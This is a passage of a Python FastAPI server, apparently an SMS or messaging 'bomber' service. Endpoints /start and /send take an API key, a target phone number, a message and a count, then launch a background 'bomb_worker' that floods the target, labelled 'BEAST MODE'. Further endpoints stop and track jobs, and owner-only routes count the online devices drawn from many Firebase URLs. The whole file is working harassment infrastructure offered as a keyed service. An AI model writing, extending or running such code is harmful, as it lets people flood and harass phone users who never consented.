@app.api_route("/start", methods=["GET", "POST"])
async def start_endpoint(request: Request, bg: BackgroundTasks):
    is_get = request.method == "GET"
    query_data = dict(request.query_params)

    body_data = {}
    if not is_get:
        try:
            body_data = await request.json()
        except Exception:
            try:
                form = await request.form()
                body_data = dict(form)
            except Exception:
                body_data = {}

    merged = {**query_data, **body_data}

    api_key = extract_key(request, query_data, body_data)
    if not api_key:
        return JSONResponse({"success": False, "error": "🔑 API key required"}, 401)
    if not verify_key(api_key):
        return JSONResponse({"success": False, "error": "❌ Invalid API key"}, 401)

    raw_message = merged.get("message") or merged.get("msg") or ""
    message = fix_message(raw_message, is_get)

    number = merged.get("number") or merged.get("num") or merged.get("numer") or ""
    number = str(number).strip()

    count_str = merged.get("count", "1")

    if not message or not message.strip():
        return JSONResponse({"success": False, "error": "Missing message"}, 400)
    if not number:
        return JSONResponse({"success": False, "error": "Missing number"}, 400)

    clean_number = norm_number(number)
    if not clean_number.isdigit() or len(clean_number) < 10 or len(clean_number) > 15:
        return JSONResponse(
            {"success": False, "error": "Invalid number (10-15 digits)"}, 400
        )

    try:
        count = int(count_str)
        if count <= 0:
            raise ValueError
    except Exception:
        return JSONResponse({"success": False, "error": "invalid count"}, 400)

    if clean_number in _RUNNING_TASKS:
        return JSONResponse({
            "success": False,
            "error": "⚠️ Job already running for this number",
            "hint": f"Pehle /stop karo: /stop?key={api_key}&number={clean_number}",
            "active_job_id": _RUNNING_TASKS[clean_number],
        }, 409)

    effective_count = count if MAX_PER_DEVICE == 0 else min(count, MAX_PER_DEVICE)
    jid = str(uuid4())[:8]

    _JOBS[jid] = {
        "jid": jid,
        "number": clean_number,
        "count": effective_count,
        "message_preview": message[:80],
        "message_length": len(message),
        "key_used": api_key,
        "status": "starting",
        "started_at": time.time(),
        "total": 0,
        "done": 0,
        "ok": 0,
        "blk": 0,
        "fail": 0,
    }

    bg.add_task(bomb_worker, clean_number, message, effective_count, api_key, jid)
    _RUNNING_TASKS[clean_number] = jid

    return {
        "success": True,
        "api": API_NAME,
        "version": API_VERSION,
        "job_id": jid,
        "status": "started",
        "target": clean_number,
        "message_length": len(message),
        "per_device": effective_count,
        "mode": "BEAST MODE v11.3",
        "stop_url": f"/stop?key={api_key}&number={clean_number}",
        "status_url": f"/status?key={api_key}&job_id={jid}",
    }


# Alias: /send bhi kaam karega
@app.api_route("/send", methods=["GET", "POST"])
async def send_endpoint(request: Request, bg: BackgroundTasks):
    return await start_endpoint(request, bg)


# ═══════════════════════════════════════════════════════════
# 🛑 /stop
# ═══════════════════════════════════════════════════════════
@app.get("/stop")
async def stop_endpoint(
    request: Request,
    number: str = Query(None),
    job_id: str = Query(None),
    key: str = Query(None),
):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse({"success": False, "error": "🔑 Valid key required"}, 401)

    if not number and not job_id:
        return JSONResponse({"success": False, "error": "Provide number or job_id"}, 400)

    stopped_jobs = []

    if job_id:
        job = _JOBS.get(job_id)
        if job:
            number = job["number"]
        else:
            return JSONResponse(
                {"success": False, "error": f"Job {job_id} not found"}, 404
            )

    if not number:
        return JSONResponse({"success": False, "error": "No target number"}, 400)

    number = norm_number(number)
    _LOCAL_STOP.add(number)

    if redis:
        try:
            await redis.set(f"stop:{number}", "1", ex=300)
        except Exception:
            pass

    for jid, job in _JOBS.items():
        if job["number"] == number and job["status"] in ("starting", "running"):
            job["status"] = "stopping"
            stopped_jobs.append(jid)

    return {
        "success": True,
        "message": f"🛑 Stop signal sent for {number}",
        "number": number,
        "stopped_jobs": stopped_jobs,
        "note": "1-2 seconds me ruk jayega",
    }


# ═══════════════════════════════════════════════════════════
# 📊 /status
# ═══════════════════════════════════════════════════════════
@app.get("/status")
async def status_endpoint(
    request: Request,
    job_id: str = Query(None),
    number: str = Query(None),
    key: str = Query(None),
):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse({"success": False, "error": "🔑 Valid key required"}, 401)

    if job_id:
        job = _JOBS.get(job_id)
        if not job:
            return JSONResponse(
                {"success": False, "error": f"Job {job_id} not found"}, 404
            )
        pct = 0
        if job.get("total", 0) > 0:
            pct = round(job.get("done", 0) / job["total"] * 100, 1)
        return {"success": True, "job": job, "progress_percent": pct}

    if number:
        number = norm_number(number)
        jobs = [j for j in _JOBS.values() if j["number"] == number]
        return {"success": True, "number": number, "total_jobs": len(jobs), "jobs": jobs}

    return JSONResponse({"success": False, "error": "Provide job_id or number"}, 400)


# ═══════════════════════════════════════════════════════════
# 📋 /jobs
# ═══════════════════════════════════════════════════════════
@app.get("/jobs")
async def jobs_endpoint(request: Request, key: str = Query(None)):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse({"success": False, "error": "🔑 Valid key required"}, 401)

    running = [j for j in _JOBS.values() if j["status"] in ("starting", "running", "stopping")]
    recent = sorted(_JOBS.values(), key=lambda x: x.get("started_at", 0), reverse=True)[:20]

    return {
        "success": True,
        "running_jobs": running,
        "recent_jobs": recent,
        "total_jobs_in_memory": len(_JOBS),
    }


# ═══════════════════════════════════════════════════════════
# 📱 /devices — OWNER ONLY
# ═══════════════════════════════════════════════════════════
@app.get("/devices")
async def devices_endpoint(request: Request, key: str = Query(None)):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not is_owner(api_key):
        return JSONResponse({"success": False, "error": "🔒 Owner access only"}, 403)

    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=600)
    timeout = aiohttp.ClientTimeout(total=30, connect=5)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        results = await asyncio.gather(
            *[fetch_devices_from(session, u) for u in FIREBASE_URLS],
            return_exceptions=True,
        )

    online_fb = empty_fb = offline_fb = 0
    per_fb = {}
    for url, r in zip(FIREBASE_URLS, results):
        if isinstance(r, list):
            if len(r) > 0:
                online_fb += 1
                per_fb[url] = len(r)
            else:
                empty_fb += 1
        else:
            offline_fb += 1

    return {
        "success": True,
        "total_online_devices": sum(per_fb.values()),
        "online_firebase": online_fb,
        "empty_firebase": empty_fb,
        "offline_firebase": offline_fb,
        "total_firebase": len(FIREBASE_URLS),
        "per_firebase": per_fb,
    }


# ═══════════════════════════════════════════════════════════
# 🌐 /firebases — OWNER ONLY
# ═══════════════════════════════════════════════════════════
@app.get("/firebases")
async def firebases_endpoint(request: Request, key: str = Query(None)):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not is_owner(api_key):
        return JSONResponse({"success": False, "error": "🔒 Owner access only"}, 403)

    return {"success": True, "total": len(FIREBASE_URLS), "firebases": FIREBASE_URLS}


handler = app

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
